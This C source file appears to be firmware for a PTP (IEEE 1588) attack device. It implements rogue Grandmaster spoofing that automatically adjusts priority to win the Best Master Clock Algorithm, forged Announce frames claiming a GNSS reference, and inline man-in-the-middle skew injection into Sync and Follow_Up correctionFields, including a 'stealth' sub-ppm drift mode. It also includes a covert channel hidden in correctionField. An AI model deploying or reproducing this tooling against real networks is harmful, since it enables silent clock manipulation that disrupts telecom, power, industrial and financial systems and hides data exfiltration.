/*
 * ptp_engine.c — IEEE 1588 PTP frame engine implementation
 *
 * Implements PTP frame parsing, Best Master Clock Algorithm (BMCA) decision,
 * Grandmaster spoofing, skew/drift injection via correctionField, and
 * covert-channel encoding.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#include <string.h>
#include "ptp_engine.h"
#include "board.h"
#include "registers.h"

/* --------------------------------------------------------------------- */
/*  Endian helpers (PTP is big-endian on the wire)                        */
/* --------------------------------------------------------------------- */
static uint16_t rd_be16(const uint8_t *p)
{
    return ((uint16_t)p[0] << 8) | p[1];
}

static uint32_t rd_be32(const uint8_t *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8)  | p[3];
}

static uint64_t rd_be48(const uint8_t *p)
{
    uint64_t v = 0;
    for (int i = 0; i < 6; i++)
        v = (v << 8) | p[i];
    return v;
}

static int64_t rd_be64_signed(const uint8_t *p)
{
    uint64_t u = 0;
    for (int i = 0; i < 8; i++)
        u = (u << 8) | p[i];
    return (int64_t)u;
}

static void wr_be16(uint8_t *p, uint16_t v)
{
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)(v & 0xFF);
}

static void wr_be32(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)(v & 0xFF);
}

static void wr_be48(uint8_t *p, uint64_t v)
{
    for (int i = 0; i < 6; i++)
        p[5 - i] = (uint8_t)(v >> (i * 8));
}

static void wr_be64(uint8_t *p, int64_t v)
{
    uint64_t u = (uint64_t)v;
    for (int i = 0; i < 8; i++)
        p[7 - i] = (uint8_t)(u >> (i * 8));
}

static int64_t rd_be64_signed_cf(const uint8_t *p)
{
    /* correctionField is 64-bit signed big-endian */
    uint64_t u = 0;
    for (int i = 0; i < 8; i++)
        u = (u << 8) | p[i];
    return (int64_t)u;
}

/* --------------------------------------------------------------------- */
/*  PTP header classification                                              */
/* --------------------------------------------------------------------- */
static ptp_msg_type_t ptp_classify(const uint8_t *frame, uint32_t len,
                                    int *ptp_offset, int *is_udp)
{
    if (len < 14 + 34)
        return PTP_MSG_UNKNOWN;

    /* Check EtherType */
    uint16_t ethertype = ((uint16_t)frame[12] << 8) | frame[13];

    if (ethertype == PTP_TRANSPORT_ETHERNET) {
        *ptp_offset = 14;
        *is_udp = 0;
    } else if (ethertype == 0x8100) {
        /* VLAN tag — inner ethertype at +16 */
        uint16_t inner = ((uint16_t)frame[16] << 8) | frame[17];
        if (inner != PTP_TRANSPORT_ETHERNET)
            return PTP_MSG_UNKNOWN;
        *ptp_offset = 18;
        *is_udp = 0;
    } else if (ethertype == 0x0800) {
        /* IPv4 — look for UDP with port 123 (NTP) or PTP event/general */
        /* Skip IP header to find UDP */
        if (len < 14 + 20 + 8)
            return PTP_MSG_UNKNOWN;
        if (frame[14 + 9] != 0x11)   /* protocol = UDP */
            return PTP_MSG_UNKNOWN;
        uint8_t ihl = (frame[14] & 0x0F) * 4;
        if (len < (uint32_t)(14 + ihl + 8))
            return PTP_MSG_UNKNOWN;
        uint16_t dst_port = ((uint16_t)frame[14 + ihl + 2] << 8) |
                             frame[14 + ihl + 3];
        if (dst_port == 319 || dst_port == 320 || dst_port == 123) {
            *ptp_offset = 14 + ihl + 8;
            *is_udp = 1;
        } else {
            return PTP_MSG_UNKNOWN;
        }
    } else {
        return PTP_MSG_UNKNOWN;
    }

    const uint8_t *ph = frame + *ptp_offset;
    uint8_t msg_type = ph[0] & 0x0F;
    if (msg_type > 0xD)
        return PTP_MSG_UNKNOWN;
    return (ptp_msg_type_t)msg_type;
}

/* --------------------------------------------------------------------- */
/*  Init                                                                   */
/* --------------------------------------------------------------------- */
void ptp_engine_init(ptp_engine_state_t *st)
{
    memset(st, 0, sizeof(*st));
    st->mode = MODE_PASSIVE_SNIFF;
    st->my_sequence_id = 1;

    /* Generate a clockIdentity from a fixed jayis1 OUI-based prefix.
     * The first 3 bytes are an OUI; we use a locally administered one.
     * The last 5 bytes are unique-per-device; in real hardware we'd derive
     * from MAC, here we use a fixed default for reproducibility.
     */
    st->my_clock_identity[0] = 0x02;   /* locally administered */
    st->my_clock_identity[1] = 0x00;
    st->my_clock_identity[2] = 0x00;
    st->my_clock_identity[3] = 0xFF;
    st->my_clock_identity[4] = 0xFE;
    st->my_clock_identity[5] = 0x00;
    st->my_clock_identity[6] = 0x00;
    st->my_clock_identity[7] = 0x01;

    /* Default spoofed GM — claims to be a GNSS-disciplined primary ref */
    st->spoofed_gm.grandmaster_priority1 = 0;
    st->spoofed_gm.grandmaster_clock_quality.clock_class = 6;
    st->spoofed_gm.grandmaster_clock_quality.clock_accuracy = 0x20;
    st->spoofed_gm.grandmaster_clock_quality.clock_variance = -4000;
    st->spoofed_gm.grandmaster_priority2 = 0;
    memcpy(st->spoofed_gm.grandmaster_identity, st->my_clock_identity, 8);
    st->spoofed_gm.domain_number = 0;
    st->spoofed_gm.steps_removed = 0;

    st->skew.profile = SKEW_STEP;
    st->skew.offset_ns = 0;
    st->skew.rate_nsps = 0;
    st->skew.active = 0;
}

/* --------------------------------------------------------------------- */
/*  Compute skew based on profile + elapsed time                           */
/* --------------------------------------------------------------------- */
int64_t ptp_engine_compute_skew(ptp_engine_state_t *st, uint32_t now_ms)
{
    if (!st->skew.active)
        return 0;

    int64_t skew = 0;
    switch (st->skew.profile) {
    case SKEW_STEP:
        skew = st->skew.offset_ns;
        break;
    case SKEW_RAMP: {
        /* Linear ramp: offset += rate * elapsed_seconds */
        skew = st->skew.rate_nsps * (int64_t)(now_ms / 1000);
        if (st->skew.offset_ns != 0 && skew > st->skew.offset_ns)
            skew = st->skew.offset_ns;
        break;
    }
    case SKEW_STEALTH: {
        /* Sub-ppm drift: rate_nsps is in ns/s (equivalent to ppb).
         * skew = rate_ns/s * elapsed_s
         */
        skew = st->skew.rate_nsps * (int64_t)(now_ms / 1000);
        break;
    }
    case SKEW_JITTER: {
        /* Pseudo-random jitter: LFSR-based, amplitude jitter_amp_ns */
        static uint32_t lfsr = 0xDEADBEEFu;
        lfsr = (lfsr << 1) | (__builtin_parity(lfsr & 0xE1000000u));
        int64_t rnd = (int64_t)(lfsr % (2 * st->skew.jitter_amp_ns + 1))
                       - (int64_t)st->skew.jitter_amp_ns;
        skew = st->skew.offset_ns + rnd;
        break;
    }
    case SKEW_SAWTOOTH: {
        /* Periodic ramp-and-reset: period in ms */
        uint32_t period = st->skew.sawtooth_period_ms;
        if (period == 0) period = 60000; /* default 60 s */
        uint32_t phase = now_ms % period;
        skew = (st->skew.offset_ns * (int64_t)phase) / (int64_t)period;
        break;
    }
    default:
        skew = 0;
    }
    st->current_skew_ns = skew;
    return skew;
}

/* --------------------------------------------------------------------- */
/*  Set skew profile from app command                                     */
/* --------------------------------------------------------------------- */
void ptp_engine_set_skew(ptp_engine_state_t *st, const skew_config_t *cfg)
{
    memcpy(&st->skew, cfg, sizeof(skew_config_t));
    st->last_announce_tick = 0;
}

/* --------------------------------------------------------------------- */
/*  Set spoofed GM descriptor                                             */
/* --------------------------------------------------------------------- */
void ptp_engine_set_spoof_gm(ptp_engine_state_t *st,
                               const ptp_gm_descriptor_t *gm)
{
    memcpy(&st->spoofed_gm, gm, sizeof(ptp_gm_descriptor_t));
}

/* --------------------------------------------------------------------- */
/*  Parse Announce to extract GM descriptor                                */
/* --------------------------------------------------------------------- */
int ptp_engine_parse_announce(const uint8_t *ptp_hdr, uint32_t hdr_len,
                                 ptp_gm_descriptor_t *out)
{
    if (hdr_len < PTP_ANN_END)
        return -1;

    uint8_t msg_type = ptp_hdr[PTP_HDR_MSG_TYPE] & 0x0F;
    if (msg_type != PTP_MSG_ANNOUNCE)
        return -1;

    out->domain_number = ptp_hdr[PTP_HDR_DOMAIN_NUMBER];
    out->grandmaster_priority1 = ptp_hdr[PTP_ANN_GRANDMASTER_PRIO1];
    out->grandmaster_clock_quality.clock_class =
        ptp_hdr[PTP_ANN_GM_CLK_CLASS];
    out->grandmaster_clock_quality.clock_accuracy =
        ptp_hdr[PTP_ANN_GM_CLK_ACCURACY];
    out->grandmaster_clock_quality.clock_variance =
        (int16_t)rd_be16(&ptp_hdr[PTP_ANN_GM_CLK_VARIANCE]);
    out->grandmaster_priority2 = ptp_hdr[PTP_ANN_GM_PRIO2];
    memcpy(out->grandmaster_identity, &ptp_hdr[PTP_ANN_GM_IDENTITY], 8);
    out->steps_removed = rd_be16(&ptp_hdr[PTP_ANN_STEPS_REMOVED]);

    /* currentOffset: 48-bit secs + 32-bit ns at offset 34 */
    out->current_offset.seconds = rd_be48(&ptp_hdr[34]);
    out->current_offset.nanoseconds = rd_be32(&ptp_hdr[40]);

    return 0;
}

/* --------------------------------------------------------------------- */
/*  Compare two GM descriptors per BMCA (§9.2.2)                           */
/*  Returns negative if `us` wins, positive if `them` wins, 0 if tie.    */
/* --------------------------------------------------------------------- */
static int bmca_compare(const ptp_gm_descriptor_t *us,
                         const ptp_gm_descriptor_t *them)
{
    if (us->grandmaster_priority1 != them->grandmaster_priority1)
        return (int)us->grandmaster_priority1 - (int)them->grandmaster_priority1;
    if (us->grandmaster_clock_quality.clock_class !=
        them->grandmaster_clock_quality.clock_class)
        return (int)us->grandmaster_clock_quality.clock_class -
               (int)them->grandmaster_clock_quality.clock_class;
    if (us->grandmaster_clock_quality.clock_accuracy !=
        them->grandmaster_clock_quality.clock_accuracy)
        return (int)us->grandmaster_clock_quality.clock_accuracy -
               (int)them->grandmaster_clock_quality.clock_accuracy;
    if (us->grandmaster_clock_quality.clock_variance !=
        them->grandmaster_clock_quality.clock_variance)
        return us->grandmaster_clock_quality.clock_variance -
               them->grandmaster_clock_quality.clock_variance;
    if (us->grandmaster_priority2 != them->grandmaster_priority2)
        return (int)us->grandmaster_priority2 -
               (int)them->grandmaster_priority2;
    return memcmp(us->grandmaster_identity, them->grandmaster_identity, 8);
}

int ptp_engine_would_win_bmca(const ptp_gm_descriptor_t *us,
                                const ptp_gm_descriptor_t *them)
{
    return bmca_compare(us, them) < 0;
}

/* --------------------------------------------------------------------- */
/*  Build a PTP Announce frame                                              */
/* --------------------------------------------------------------------- */
uint32_t ptp_engine_build_announce(const ptp_gm_descriptor_t *gm,
                                     const uint8_t *src_mac,
                                     uint16_t sequence_id,
                                     uint8_t *out, uint32_t max_len)
{
    if (max_len < 14 + PTP_ANN_END)
        return 0;

    /* Ethernet header: dst = PTP multicast 01-1B-19-00-00-00 (peer delay)
     * or 01-80-C2-00-00-0E (forwardable). We use 01-1B-19-00-00-00.
     */
    memset(out, 0, 14 + PTP_ANN_END);
    out[0] = 0x01; out[1] = 0x1B; out[2] = 0x19;
    out[3] = 0x00; out[4] = 0x00; out[5] = 0x00;
    memcpy(&out[6], src_mac, 6);
    out[12] = 0x88; out[13] = 0xF7;   /* EtherType = PTP */

    uint8_t *ph = out + 14;
    /* versionPTP = 2, msgType = ANNOUNCE (0xB) */
    ph[PTP_HDR_VERSION_PTP] = (2 << 4) | PTP_MSG_ANNOUNCE;
    /* messageLength = Announce size = 64 bytes */
    wr_be16(&ph[PTP_HDR_MSG_LENGTH], PTP_ANN_END);
    ph[PTP_HDR_DOMAIN_NUMBER] = gm->domain_number;
    /* flags: byte 0 = 0x0A (twoStep + PTP profile Specific1) is wrong;
     * for Announce, flags = 0x0000 typically.
     */
    ph[PTP_HDR_FLAG_FIELD] = 0x00;
    ph[PTP_HDR_FLAG_FIELD + 1] = 0x00;
    /* correctionField = 0 for Announce */
    memset(&ph[PTP_HDR_CORRECTION], 0, 8);
    /* clockIdentity = our GM identity */
    memcpy(&ph[PTP_HDR_CLOCK_ID], gm->grandmaster_identity, 8);
    /* sourcePortID = 0x0001 (port number) */
    ph[28] = 0x00; ph[29] = 0x01;
    /* sequenceId */
    wr_be16(&ph[PTP_HDR_SEQ_ID], sequence_id);
    /* control field = 5 for Announce */
    ph[PTP_HDR_CONTROL] = 0x05;
    /* logMessageInterval = 0 (1 per second) */
    ph[PTP_HDR_LOG_MSG_INT] = 0x00;

    /* Announce payload: currentOffset (10 bytes: 6s + 4ns) */
    /* Use a plausible timestamp: seconds since epoch + 0 ns */
    wr_be48(&ph[34], gm->current_offset.seconds);
    wr_be32(&ph[40], gm->current_offset.nanoseconds);

    /* currentUTCOffset (2 bytes) — 37 seconds (TAI-UTC) */
    wr_be16(&ph[54], 37);
    /* grandmasterPriority1 */
    ph[PTP_ANN_GRANDMASTER_PRIO1] = gm->grandmaster_priority1;
    /* clockQuality: class, accuracy, variance */
    ph[PTP_ANN_GM_CLK_CLASS] = gm->grandmaster_clock_quality.clock_class;
    ph[PTP_ANN_GM_CLK_ACCURACY] = gm->grandmaster_clock_quality.clock_accuracy;
    wr_be16(&ph[PTP_ANN_GM_CLK_VARIANCE],
            (uint16_t)gm->grandmaster_clock_quality.clock_variance);
    /* grandmasterPriority2 */
    ph[PTP_ANN_GM_PRIO2] = gm->grandmaster_priority2;
    /* grandmasterIdentity */
    memcpy(&ph[PTP_ANN_GM_IDENTITY], gm->grandmaster_identity, 8);
    /* stepsRemoved = 0 (we are the GM) */
    wr_be16(&ph[PTP_ANN_STEPS_REMOVED], gm->steps_removed);

    /* Time source = 0x20 (GNSS) — 1 byte at offset 72 */
    ph[72] = 0x20;

    return 14 + PTP_ANN_END;
}

/* --------------------------------------------------------------------- */
/*  Covert channel encode/decode (correctionField low 8 bits)             */
/* --------------------------------------------------------------------- */
void ptp_engine_covert_encode_byte(uint8_t *cf8, uint8_t byte_val)
{
    /* Preserve high 56 bits, encode 1 byte in low 8 bits of correctionField.
     * To stay plausible (path delay rarely > 1 µs = 1000 ns), we keep the
     * top 6 bytes zero and use bytes 6-7 as: byte6 = 0x00 (ns high),
     * byte7 = byte_val. This gives correctionField in range 0-255 ns which
     * is plausible path delay.
     */
    cf8[0] = 0; cf8[1] = 0; cf8[2] = 0; cf8[3] = 0;
    cf8[4] = 0; cf8[5] = 0; cf8[6] = 0;
    cf8[7] = byte_val;
}

uint8_t ptp_engine_covert_decode_byte(const uint8_t *cf8)
{
    return cf8[7];
}

/* --------------------------------------------------------------------- */
/*  Apply skew to a PTP frame's correctionField                            */
/* --------------------------------------------------------------------- */
static void apply_skew_to_frame(uint8_t *ptp_hdr, int64_t skew_ns)
{
    /* Read existing correctionField, add skew, write back */
    int64_t cf = rd_be64_signed_cf(&ptp_hdr[PTP_HDR_CORRECTION]);
    cf += skew_ns;
    /* Clamp to plausible range: ±1 second (±1e9 ns) */
    if (cf > 1000000000LL) cf = 1000000000LL;
    if (cf < -1000000000LL) cf = -1000000000LL;
    wr_be64(&ptp_hdr[PTP_HDR_CORRECTION], cf);
}

/* --------------------------------------------------------------------- */
/*  RX frame processing                                                    */
/* --------------------------------------------------------------------- */
int ptp_engine_rx_frame(ptp_engine_state_t *st,
                         const uint8_t *frame, uint32_t len,
                         uint64_t ts_ns,
                         uint8_t *out, uint32_t *out_len)
{
    int ptp_off = 0;
    int is_udp = 0;
    ptp_msg_type_t mtype = ptp_classify(frame, len, &ptp_off, &is_udp);

    st->frames_captured++;

    if (mtype == PTP_MSG_UNKNOWN) {
        /* Non-PTP frame — pass through unmodified in inline mode */
        if (st->mode == MODE_INLINE_MITM || st->mode == MODE_TRANSPARENT_ONLY) {
            memcpy(out, frame, len);
            *out_len = len;
            return 1;
        }
        return 0;  /* drop in passive/rogue modes (we only care about PTP) */
    }

    /* PTP frame — parse it */
    const uint8_t *ph = frame + ptp_off;
    uint32_t ph_len = len - ptp_off;

    /* If Announce, extract GM info */
    if (mtype == PTP_MSG_ANNOUNCE && ph_len >= PTP_ANN_END) {
        ptp_gm_descriptor_t observed;
        if (ptp_engine_parse_announce(ph, ph_len, &observed) == 0) {
            memcpy(&st->observed_gm, &observed, sizeof(observed));

            /* In rogue-GM mode, auto-adjust our spoofed GM to win */
            if (st->mode == MODE_ROGUE_GM) {
                if (!ptp_engine_would_win_bmca(&st->spoofed_gm,
                                                &st->observed_gm)) {
                    /* Lower our priority1 to beat theirs */
                    if (st->spoofed_gm.grandmaster_priority1 >=
                        observed.grandmaster_priority1) {
                        st->spoofed_gm.grandmaster_priority1 =
                            (observed.grandmaster_priority1 > 0) ?
                            observed.grandmaster_priority1 - 1 : 0;
                    }
                }
            }
        }
    }

    /* In passive mode, just log and drop (don't forward) */
    if (st->mode == MODE_PASSIVE_SNIFF) {
        return 0;
    }

    /* In transparent mode (post-tamper), forward unmodified */
    if (st->mode == MODE_TRANSPARENT_ONLY) {
        memcpy(out, frame, len);
        *out_len = len;
        return 1;
    }

    /* In inline MITM or rogue-GM mode, apply skew to Sync/Follow_Up frames */
    if (mtype == PTP_MSG_SYNC || mtype == PTP_MSG_FOLLOW_UP ||
        mtype == PTP_MSG_DELAY_RESP) {
        memcpy(out, frame, len);
        *out_len = len;

        if (st->skew.active) {
            uint32_t now_ms = (uint32_t)(ts_ns / 1000000ULL);
            int64_t skew = ptp_engine_compute_skew(st, now_ms);
            if (skew != 0) {
                apply_skew_to_frame(out + ptp_off, skew);
                st->frames_modified++;
            }
        }
        return 1;
    }

    /* Default: forward */
    memcpy(out, frame, len);
    *out_len = len;
    return 1;
}

/* --------------------------------------------------------------------- */
/*  Generate Announce (rogue-GM mode)                                     */
/* --------------------------------------------------------------------- */
uint32_t ptp_engine_generate_announce(ptp_engine_state_t *st,
                                       uint8_t *out, uint32_t max_len,
                                       uint32_t now_ms)
{
    if (st->mode != MODE_ROGUE_GM)
        return 0;

    /* Announce at 1 Hz (logMessageInterval = 0) */
    if (now_ms - st->last_announce_tick < 1000)
        return 0;
    st->last_announce_tick = now_ms;

    /* Update current_offset timestamp from local clock (simplified) */
    st->spoofed_gm.current_offset.seconds =
        (uint64_t)now_ms / 1000ULL + 3900000000ULL; /* plausible epoch */
    st->spoofed_gm.current_offset.nanoseconds =
        (uint32_t)((now_ms % 1000) * 1000000);

    /* Use our MAC as source (simplified — in real HW we'd read MAC) */
    uint8_t src_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};

    uint32_t flen = ptp_engine_build_announce(&st->spoofed_gm, src_mac,
                                               st->my_sequence_id++,
                                               out, max_len);
    return flen;
}

/* --------------------------------------------------------------------- */
/*  Periodic tick                                                          */
/* --------------------------------------------------------------------- */
void ptp_engine_tick(ptp_engine_state_t *st, uint32_t now_ms)
{
    /* Nothing additional for now — frame generation is pull-based via
     * ptp_engine_generate_announce() from the main loop.
     */
    (void)st;
    (void)now_ms;
}